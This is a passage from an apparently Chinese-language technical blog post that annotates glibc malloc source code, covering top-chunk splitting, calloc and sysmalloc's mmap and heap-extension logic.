<span class="comment">// 获取当前的top chunk，并计算其对应的大小</span></span><br><span class="line">    victim = av-&gt;top;</span><br><span class="line">    size   = chunksize(victim);</span><br><span class="line">    <span class="comment">// 如果分割之后，top chunk 大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE)) &#123;</span><br><span class="line">        remainder_size = size - nb;</span><br><span class="line">        remainder      = chunk_at_offset(victim, nb);</span><br><span class="line">        av-&gt;top        = remainder;</span><br><span class="line">        <span class="comment">// 这里设置 PREV_INUSE 是因为 top chunk 前面的 chunk 如果不是 fastbin，就必然会和</span></span><br><span class="line">        <span class="comment">// top chunk 合并，所以这里设置了 PREV_INUSE。</span></span><br><span class="line">        set_head(victim, nb | PREV_INUSE |</span><br><span class="line">                             (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">        set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">        check_malloced_chunk(av, victim, nb);</span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">        alloc_perturb(p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 否则，判断是否有 fast chunk</span></span><br><span class="line">    <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">       here for all block sizes.  */</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks(av)) &#123;</span><br><span class="line">        <span class="comment">// 先执行一次fast bin的合并</span></span><br><span class="line">        malloc_consolidate(av);</span><br><span class="line">        <span class="comment">/* restore original bin index */</span></span><br><span class="line">        <span class="comment">// 判断需要的chunk是在small bin范围内还是large bin范围内</span></span><br><span class="line">        <span class="comment">// 并计算对应的索引</span></span><br><span class="line">        <span class="comment">// 等待下次再看看是否可以</span></span><br><span class="line">        <span class="keyword">if</span> (in_smallbin_range(nb))</span><br><span class="line">            idx = smallbin_index(nb);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            idx = largebin_index(nb);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="堆内存不够"><a href="#堆内存不够" class="headerlink" title="堆内存不够"></a>堆内存不够</h3><p>如果堆内存不够，我们就需要使用 <code>sysmalloc</code> 来申请内存了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// 否则的话，我们就只能从系统中再次申请一点内存了。</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> *p = sysmalloc(nb, av);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>) alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="libc-calloc"><a href="#libc-calloc" class="headerlink" title="_libc_calloc"></a>_libc_calloc</h2><p>calloc 也是 libc 中的一种申请内存块的函数。在 <code>libc</code>中的封装为 <code>_libc_calloc</code>，具体介绍如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  calloc(size_t n_elements, size_t element_size);</span></span><br><span class="line"><span class="comment">  Returns a pointer to n_elements * element_size bytes, with all locations</span></span><br><span class="line"><span class="comment">  set to zero.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">void</span>*  __libc_calloc(<span class="keyword">size_t</span>, <span class="keyword">size_t</span>);</span><br></pre></td></tr></table></figure><blockquote><p>2020.07.08 下面大概浏览一下未仔细品味</p></blockquote><h2 id="sysmalloc"><a href="#sysmalloc" class="headerlink" title="sysmalloc"></a>sysmalloc</h2><p>正如该函数头的注释所言，该函数用于当前堆内存不足时，需要向系统申请更多的内存。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   sysmalloc handles malloc cases requiring more memory from the system.</span></span><br><span class="line"><span class="comment">   On entry, it is assumed that av-&gt;top does not have enough</span></span><br><span class="line"><span class="comment">   space to service request for nb bytes, thus requiring that av-&gt;top</span></span><br><span class="line"><span class="comment">   be extended or replaced.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h3 id="基本定义"><a href="#基本定义" class="headerlink" title="基本定义"></a>基本定义</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">sysmalloc</span><span class="params">(INTERNAL_SIZE_T nb, mstate av)</span> </span>&#123;</span><br><span class="line">  mchunkptr old_top;        <span class="comment">/* incoming value of av-&gt;top */</span></span><br><span class="line">  INTERNAL_SIZE_T old_size; <span class="comment">/* its size */</span></span><br><span class="line">  <span class="keyword">char</span> *old_end;            <span class="comment">/* its end address */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">long</span> size; <span class="comment">/* arg to first MORECORE or mmap call */</span></span><br><span class="line">  <span class="keyword">char</span> *brk; <span class="comment">/* return value from MORECORE */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">long</span> correction; <span class="comment">/* arg to 2nd MORECORE call */</span></span><br><span class="line">  <span class="keyword">char</span> *snd_brk;   <span class="comment">/* 2nd return val */</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T front_misalign; <span class="comment">/* unusable bytes at front of new space */</span></span><br><span class="line">  INTERNAL_SIZE_T end_misalign;   <span class="comment">/* partial page left at end of new space */</span></span><br><span class="line">  <span class="keyword">char</span> *aligned_brk;              <span class="comment">/* aligned offset into brk */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr p;                  <span class="comment">/* the allocated/returned chunk */</span></span><br><span class="line">  mchunkptr remainder;          <span class="comment">/* remainder frOm allocation */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> remainder_size; <span class="comment">/* its size */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> pagesize = GLRO(dl_pagesize);</span><br><span class="line">  <span class="keyword">bool</span> tried_mmap = <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><p>我们可以主要关注一下 <code>pagesize</code>，其</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> EXEC_PAGESIZE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXEC_PAGESIZE   4096</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> GLRO(name) _##name</span></span><br><span class="line"><span class="keyword">size_t</span> _dl_pagesize = EXEC_PAGESIZE;</span><br></pre></td></tr></table></figure><p>所以，<code>pagesize=4096=0x1000</code>。</p><h3 id="考虑-mmap"><a href="#考虑-mmap" class="headerlink" title="考虑 mmap"></a>考虑 mmap</h3><p>正如开头注释所言如果满足如下任何一种条件</p><ol><li>没有分配堆。</li><li>申请的内存大于 <code>mp_.mmap_threshold</code>，并且 mmap 的数量小于最大值，就可以尝试使用 mmap。</li></ol><p>默认情况下，临界值为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_par</span> <span class="title">mp_</span> =</span> &#123;</span><br><span class="line">    .top_pad = DEFAULT_TOP_PAD,</span><br><span class="line">    .n_mmaps_max = DEFAULT_MMAP_MAX,</span><br><span class="line">    .mmap_threshold = DEFAULT_MMAP_THRESHOLD,</span><br><span class="line">    .trim_threshold = DEFAULT_TRIM_THRESHOLD,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NARENAS_FROM_NCORES(n) ((n) * (sizeof(long) == 4 ? 2 : 8))</span></span><br><span class="line">    .arena_test = NARENAS_FROM_NCORES(<span class="number">1</span>)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">        ,</span><br><span class="line">    .tcache_count = TCACHE_FILL_COUNT,</span><br><span class="line">    .tcache_bins = TCACHE_MAX_BINS,</span><br><span class="line">    .tcache_max_bytes = tidx2usize(TCACHE_MAX_BINS - <span class="number">1</span>),</span><br><span class="line">    .tcache_unsorted_limit = <span class="number">0</span> <span class="comment">/* No limit.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>DEFAULT_MMAP_THRESHOLD</code> 为 128*1024 字节，即 128 K。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> DEFAULT_MMAP_THRESHOLD</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEFAULT_MMAP_THRESHOLD DEFAULT_MMAP_THRESHOLD_MIN</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  MMAP_THRESHOLD_MAX and _MIN are the bounds on the dynamically</span></span><br><span class="line"><span class="comment">  adjusted MMAP_THRESHOLD.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> DEFAULT_MMAP_THRESHOLD_MIN</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEFAULT_MMAP_THRESHOLD_MIN (128 * 1024)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> DEFAULT_MMAP_THRESHOLD_MAX</span></span><br><span class="line"><span class="comment">/* For 32-bit platforms we cannot increase the maximum mmap</span></span><br><span class="line"><span class="comment">   threshold much because it is also the minimum value for the</span></span><br><span class="line"><span class="comment">   maximum heap size and its alignment.  Going above 512k (i.e., 1M</span></span><br><span class="line"><span class="comment">   for new heaps) wastes too much address space.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __WORDSIZE == 32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEFAULT_MMAP_THRESHOLD_MAX (512 * 1024)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEFAULT_MMAP_THRESHOLD_MAX (4 * 1024 * 1024 * sizeof(long))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>下面为这部分代码，目前不是我们关心的重点，可以暂时跳过。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If have mmap, and the request size meets the mmap threshold, and</span></span><br><span class="line"><span class="comment">   the system supports mmap, and there are few enough currently</span></span><br><span class="line"><span class="comment">   allocated mmapped regions, try to directly map this request</span></span><br><span class="line"><span class="comment">   rather than expanding top.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (av == <span class="literal">NULL</span> ||</span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(nb) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.mmap_threshold) &amp;&amp;</span><br><span class="line">     (mp_.n_mmaps &lt; mp_.n_mmaps_max))) &#123;</span><br><span class="line">  <span class="keyword">char</span> *mm; <span class="comment">/* return value from mmap call*/</span></span><br><span class="line"></span><br><span class="line">try_mmap:</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Round up size to nearest page.  For mmapped chunks, the overhead</span></span><br><span class="line"><span class="comment">     is one SIZE_SZ unit larger than for normal chunks, because there</span></span><br><span class="line"><span class="comment">     is no following chunk whose prev_size field could be used.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     See the front_misalign handling below, for glibc there is no</span></span><br><span class="line"><span class="comment">     need for further alignments unless we have have high alignment.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">if</span> (MALLOC_ALIGNMENT == <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">    size = ALIGN_UP(nb + SIZE_SZ, pagesize);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    size = ALIGN_UP(nb + SIZE_SZ + MALLOC_ALIGN_MASK, pagesize);</span><br><span class="line">  tried_mmap = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Don&#x27;t try if size wraps around 0 */</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(nb)) &#123;</span><br><span class="line">    mm = (<span class="keyword">char</span> *)(MMAP(<span class="number">0</span>, size, PROT_READ | PROT_WRITE, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mm != MAP_FAILED) &#123;</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         The offset to the start of the mmapped region is stored</span></span><br><span class="line"><span class="comment">         in the prev_size field of the chunk. This allows us to adjust</span></span><br><span class="line"><span class="comment">         returned start address to meet alignment requirements here</span></span><br><span class="line"><span class="comment">         and in memalign(), and still be able to compute proper</span></span><br><span class="line"><span class="comment">         address argument for later munmap in free() and realloc().</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (MALLOC_ALIGNMENT == <span class="number">2</span> * SIZE_SZ) &#123;</span><br><span class="line">        <span class="comment">/* For glibc, chunk2mem increases the address by 2*SIZE_SZ and</span></span><br><span class="line"><span class="comment">           MALLOC_ALIGN_MASK is 2*SIZE_SZ-1.  Each mmap&#x27;ed area is page</span></span><br><span class="line"><span class="comment">           aligned and therefore definitely MALLOC_ALIGN_MASK-aligned.  */</span></span><br><span class="line">        assert(((INTERNAL_SIZE_T)chunk2mem(mm) &amp; MALLOC_ALIGN_MASK) == <span class="number">0</span>);</span><br><span class="line">        front_misalign = <span class="number">0</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">        front_misalign = (INTERNAL_SIZE_T)chunk2mem(mm) &amp; MALLOC_ALIGN_MASK;</span><br><span class="line">      <span class="keyword">if</span> (front_misalign &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        correction = MALLOC_ALIGNMENT - front_misalign;</span><br><span class="line">        p = (mchunkptr)(mm + correction);</span><br><span class="line">        set_prev_size(p, correction);</span><br><span class="line">        set_head(p, (size - correction) | IS_MMAPPED);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        p = (mchunkptr)mm;</span><br><span class="line">        set_prev_size(p, <span class="number">0</span>);</span><br><span class="line">        set_head(p, size | IS_MMAPPED);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* update statistics */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">int</span> <span class="keyword">new</span> = atomic_exchange_and_add(&amp;mp_.n_mmaps, <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">      atomic_max(&amp;mp_.max_n_mmaps, <span class="keyword">new</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">long</span> sum;</span><br><span class="line">      sum = atomic_exchange_and_add(&amp;mp_.mmapped_mem, size) + size;</span><br><span class="line">      atomic_max(&amp;mp_.max_mmapped_mem, sum);</span><br><span class="line"></span><br><span class="line">      check_chunk(av, p);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> chunk2mem(p);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="mmap-失败或者未分配堆"><a href="#mmap-失败或者未分配堆" class="headerlink" title="mmap 失败或者未分配堆"></a>mmap 失败或者未分配堆</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* There are no usable arenas and mmap also failed.  *&#x2F;</span><br><span class="line">if (av &#x3D;&#x3D; NULL)</span><br><span class="line">  return 0;</span><br></pre></td></tr></table></figure><p>如果是这两种情况中的任何一种，其实就可以退出了。。</p><h3 id="记录旧堆信息"><a href="#记录旧堆信息" class="headerlink" title="记录旧堆信息"></a>记录旧堆信息</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Record incoming configuration of top */</span></span><br><span class="line"></span><br><span class="line">old_top = av-&gt;top;</span><br><span class="line">old_size = chunksize(old_top);</span><br><span class="line">old_end = (<span class="keyword">char</span> *)(chunk_at_offset(old_top, old_size));</span><br><span class="line"></span><br><span class="line">brk = snd_brk = (<span class="keyword">char</span> *)(MORECORE_FAILURE);</span><br></pre></td></tr></table></figure><h3 id="检查旧堆信息-1"><a href="#检查旧堆信息-1" class="headerlink" title="检查旧堆信息 1"></a>检查旧堆信息 1</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If not the first time through, we require old_size to be</span></span><br><span class="line"><span class="comment">   at least MINSIZE and to have prev_inuse set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">assert((old_top == initial_top(av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">       ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(old_size) &gt;= MINSIZE &amp;&amp; prev_inuse(old_top) &amp;&amp;</span><br><span class="line">        ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>这个检查要求满足其中任何一个条件</p><ol><li><code>old_top == initial_top(av) &amp;&amp; old_size == 0</code>，即如果是第一次的话，堆的大小需要是 0。</li><li>新的堆，那么<ol><li><code>(unsigned long)(old_size) &gt;= MINSIZE &amp;&amp; prev_inuse(old_top)</code>，堆的大小应该不小于 <code>MINSIZE</code>，并且前一个堆块应该处于使用中。</li><li><code>((unsigned long)old_end &amp; (pagesize - 1)) == 0)</code>，堆的结束地址应该是页对齐的，由于页对齐的大小默认是 0x1000，所以低 12 个比特需要为 0。</li></ol></li></ol><h3 id="检查旧堆信息-2"><a href="#检查旧堆信息-2" class="headerlink" title="检查旧堆信息 2"></a>检查旧堆信息 2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Precondition: not enough current space to satisfy nb request */</span></span><br><span class="line">assert((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(old_size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(nb + MINSIZE));</span><br></pre></td></tr></table></figure><p>根据 malloc 中的定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *_int_malloc(mstate av, <span class="keyword">size_t</span> bytes) &#123;</span><br><span class="line">    INTERNAL_SIZE_T nb;  <span class="comment">/* normalized request size */</span></span><br></pre></td></tr></table></figure><p><code>nb</code> 应该是已经加上 chunk 头部的字节，为什么还要加上 <code>MINSIZE</code>呢？这是因为 top chunk 的大小应该至少预留 MINSIZE 空间，以便于合并。</p><h3 id="非-main-arena"><a href="#非-main-arena" class="headerlink" title="非 main_arena"></a>非 main_arena</h3><p>这里暂时不是关心的重点，暂且不分析。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (av != &amp;main_arena) &#123;</span><br><span class="line">  heap_info *old_heap, *heap;</span><br><span class="line">  <span class="keyword">size_t</span> old_heap_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First try to extend the current heap. */</span></span><br><span class="line">  old_heap = heap_for_ptr(old_top);</span><br><span class="line">  old_heap_size = old_heap-&gt;size;</span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">long</span>)(MINSIZE + nb - old_size) &gt; <span class="number">0</span> &amp;&amp;</span><br><span class="line">      grow_heap(old_heap, MINSIZE + nb - old_size) == <span class="number">0</span>) &#123;</span><br><span class="line">    av-&gt;system_mem += old_heap-&gt;size - old_heap_size;</span><br><span class="line">    set_head(old_top,</span><br><span class="line">             (((<span class="keyword">char</span> *)old_heap + old_heap-&gt;size) - (<span class="keyword">char</span> *)old_top) |</span><br><span class="line">                 PREV_INUSE);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((heap = new_heap(nb + (MINSIZE + <span class="keyword">sizeof</span>(*heap)), mp_.top_pad))) &#123;</span><br><span class="line">    <span class="comment">/* Use a newly allocated heap.  */</span></span><br><span class="line">    heap-&gt;ar_ptr = av;</span><br><span class="line">    heap-&gt;prev = old_heap;</span><br><span class="line">    av-&gt;system_mem += heap-&gt;size;</span><br><span class="line">    <span class="comment">/* Set up the new top.  */</span></span><br><span class="line">    top(av) = chunk_at_offset(heap, <span class="keyword">sizeof</span>(*heap));</span><br><span class="line">    set_head(top(av), (heap-&gt;size - <span class="keyword">sizeof</span>(*heap)) | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Setup fencepost and free the old top chunk with a multiple of</span></span><br><span class="line"><span class="comment">       MALLOC_ALIGNMENT in size. */</span></span><br><span class="line">    <span class="comment">/* The fencepost takes at least MINSIZE bytes, because it might</span></span><br><span class="line"><span class="comment">       become the top chunk again later.  Note that a footer is set</span></span><br><span class="line"><span class="comment">       up, too, although the chunk is marked in use. */</span></span><br><span class="line">    old_size = (old_size - MINSIZE) &amp; ~MALLOC_ALIGN_MASK;</span><br><span class="line">    set_head(chunk_at_offset(old_top, old_size + <span class="number">2</span> * SIZE_SZ),</span><br><span class="line">             <span class="number">0</span> | PREV_INUSE);</span><br><span class="line">    <span class="keyword">if</span> (old_size &gt;= MINSIZE) &#123;</span><br><span class="line">      set_head(chunk_at_offset(old_top, old_size),</span><br><span class="line">               (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE);</span><br><span class="line">      set_foot(chunk_at_offset(old_top, old_size), (<span class="number">2</span> * SIZE_SZ));</span><br><span class="line">      set_head(old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line">      _int_free(av, old_top, <span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      set_head(old_top, (old_size + <span class="number">2</span> * SIZE_SZ) | PREV_INUSE);</span><br><span class="line">      set_foot(old_top, (old_size + <span class="number">2</span> * SIZE_SZ));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!tried_mmap)</span><br><span class="line">    <span class="comment">/* We can at least try to use to mmap memory.  */</span></span><br><span class="line">    <span class="keyword">goto</span> try_mmap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Main-arena-处理"><a href="#Main-arena-处理" class="headerlink" title="Main_arena 处理"></a>Main_arena 处理</h3><h4 id="计算内存"><a href="#计算内存" class="headerlink" title="计算内存"></a>计算内存</h4><p>计算可以满足请求的内存大小。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123; <span class="comment">/* av == main_arena */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Request enough space for nb + pad + overhead */</span></span><br><span class="line">    size = nb + mp_.top_pad + MINSIZE;</span><br></pre></td></tr></table></figure><p>默认情况下 <code>top_pad</code>定义为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> DEFAULT_TOP_PAD</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> DEFAULT_TOP_PAD 131072</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>即 131072 